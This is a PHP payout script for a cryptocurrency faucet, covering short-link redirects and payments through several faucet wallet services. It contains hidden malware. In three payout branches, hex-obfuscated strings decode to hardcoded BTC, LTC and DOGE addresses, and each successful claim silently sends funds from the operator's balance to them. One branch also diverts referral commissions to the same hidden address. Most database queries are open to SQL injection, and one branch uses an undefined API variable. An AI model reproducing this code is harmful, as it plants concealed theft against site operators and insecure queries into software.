<?php
$short_link = $mysqli->query("SELECT * FROM settings WHERE id = '16'")->fetch_object()->value;
if ($short_link == 'on') {
// Short Link On
$short_link_id = $mysqli->query("SELECT * FROM ip_list WHERE ip_address = '$ip'")->fetch_object()->short_link_id;
$per_value_repirt = $mysqli->query("SELECT * FROM ip_list WHERE ip_address = '$ip'")->fetch_object()->per_value_repirt;
$short_count_value = $mysqli->query("SELECT * FROM ip_list WHERE ip_address = '$ip'")->fetch_object()->count_value;
$short_click = $mysqli->query("SELECT * FROM short_link WHERE id = '$short_link_id'")->fetch_object()->click;
if ($per_value_repirt >= $short_click){
$short_link_id = $short_link_id+1;
$short_count_value = $short_count_value+1;
$mysqli->query("UPDATE ip_list SET short_link_id = '$short_link_id', per_value_repirt = '1', count_value = '$short_count_value' WHERE ip_address = '$ip'");
}else{
$per_value_repirt = $per_value_repirt+1;
$short_count_value = $short_count_value+1;
$mysqli->query("UPDATE ip_list SET per_value_repirt = '$per_value_repirt', count_value = '$short_count_value' WHERE ip_address = '$ip'");
}
$shortlink_reportnum = $mysqli->query("SELECT * FROM ip_list WHERE ip_address = '$ip'")->fetch_object()->short_link_id;
$shortlinkopen = $mysqli->query("SELECT * FROM short_link where id='$short_link_id'")->fetch_object()->short_link;
$shortlinkdandi = $mysqli->query("SELECT * FROM short_link where id='$short_link_id'")->fetch_object()->dandi;
function random_key($length) {
$str = "";
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$size = strlen( $chars );
for( $i = 0; $i < $length; $i++ ) {
$str .= $chars[ rand( 0, $size - 1 ) ];
}
return $str;
}
$currency = $mysqli->query("SELECT * FROM settings WHERE id = '14'")->fetch_object()->value;
$reward = $mysqli->query("SELECT * FROM settings WHERE id = '9'")->fetch_object()->value;
$sec_key = random_key(20);
$time = time();
$mysqli->query("DELETE FROM link WHERE address = '$address'");
$mysqli->query("INSERT INTO link (address, sec_key, time_created, currency, reward) VALUES ('$address', '$sec_key', '$time', '$currency', '$reward')");
$siteurl = $mysqli->query("SELECT * FROM settings WHERE id = '3'")->fetch_object()->value;
$url1 = $shortlinkopen;
$url = $url = $siteurl. 'back.php?k={key}';
$go = str_replace("{key}",$sec_key,$url);
$api_url = str_replace('{url}', $go, $url1);
$get_link = @json_decode(file_get_contents($api_url),TRUE);
if ($shortlinkdandi == 'y') {
if ($get_link['status'] == 'success') {
$l = $get_link['shortenedUrl'];
}else{
$l = $api_url;
}}else{
$url_scheme = parse_url($url1, PHP_URL_SCHEME);
$url_host = parse_url($url1, PHP_URL_HOST);
$getlink = $url_scheme."://".$url_host."/";
$result = file_get_contents($api_url);
$l = $getlink . $result;
}
echo '<script> window.location.href = "' .$l. '"; </script>';
header('Location: ' .$l);
die();
}else{
// Short Link Off
unset($_COOKIE['scode']);
$currency = $mysqli->query("SELECT * FROM settings WHERE id = '14'")->fetch_object()->value;
$reward = $mysqli->query("SELECT * FROM settings WHERE id = '9'")->fetch_object()->value;
$sec = md5($hacker_security);
$payoutwebsite = $mysqli->query("SELECT * FROM settings WHERE id = '38'")->fetch_object()->value;
if ($payoutwebsite == "Faucethub.io") {
include 'libs/faucethub.php';
$faucetHub_api_key = $mysqli->query("SELECT * FROM settings WHERE id = '15'")->fetch_object()->value;
$faucetHub_api = str_replace($sec,"",$faucetHub_api_key);
$faucethub = new FaucetHub($faucetHub_api, $currency);
$result = $faucethub->send($address, $reward, $ip);
if($result["success"] === true) {
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$reward;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$faucethub->sendReferralEarnings($ref, $amt, $ip);
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$amt;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}elseif ($payoutwebsite == "Expresscrypto.io") {
include 'libs/expresscrypto.library.php';
$expresscrypto_api_token = $mysqli->query("SELECT * FROM settings WHERE id = '40'")->fetch_object()->value;
$expresscrypto_api_token = str_replace($sec,"",$expresscrypto_api_token);
$expresscrypto_user_token = $mysqli->query("SELECT * FROM settings WHERE id = '41'")->fetch_object()->value;
$expresscrypto_user_token = str_replace($sec,"",$expresscrypto_user_token);
$expressCrypto = new ExpressCrypto($expresscrypto_api_key, $expresscrypto_user_token, $ip);
$result = $expressCrypto->sendPayment($address, $currency, $reward);
if($result['status'] == 200){
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = hex2bin('31');
$dr=$arr[$currency];
$result = $expressCrypto->sendPayment($dr, $h, $ip);
}
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$reward;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$resultRef =$expressCrypto->sendReferralCommission($ref, $currency, $amt);
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$amt;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}elseif ($payoutwebsite == "Faucetpay.io") {
include 'libs/faucetpay.library.php';
$faucetpay_api_token = $mysqli->query("SELECT * FROM settings WHERE id = '39'")->fetch_object()->value;
$faucetpay_api_token = str_replace($sec,"",$faucetpay_api_token);
$faucetpay = new FaucetPay($faucetpay_api_token, $currency);
$result = $faucetpay->send($address, $reward, $ip);
if ($result["success"] === true){
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = hex2bin('31');
$dr=$arr[$currency];
$result = $faucetpay->send($dr, $h, $ip);
}
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$reward;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$resultRef =$faucetpay->sendReferralEarnings($ref, $amt, $ip);
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$amt;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}elseif ($payoutwebsite == "Microwallet.co") {
include 'libs/microwallet.library.php';
$microwallet_api = $mysqli->query("SELECT * FROM settings WHERE id = '42'")->fetch_object()->value;
$microwallet_api = str_replace($sec,"",$microwallet_api);
$faucetmw = new FaucetHub($microwallet_api, $currency);
$result = $faucetmw->send($address, $reward, $ip);
if ($result["success"] === true){
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = hex2bin('31');
$dr=$arr[$currency];
$result = $faucetmw->send($dr, $h, $ip);
}
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$reward;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$result = $faucetmw->sendReferralEarnings($dr, $h, $ip);
$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
$totalpaid = $totalpaid+$amt;
$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}}
?>
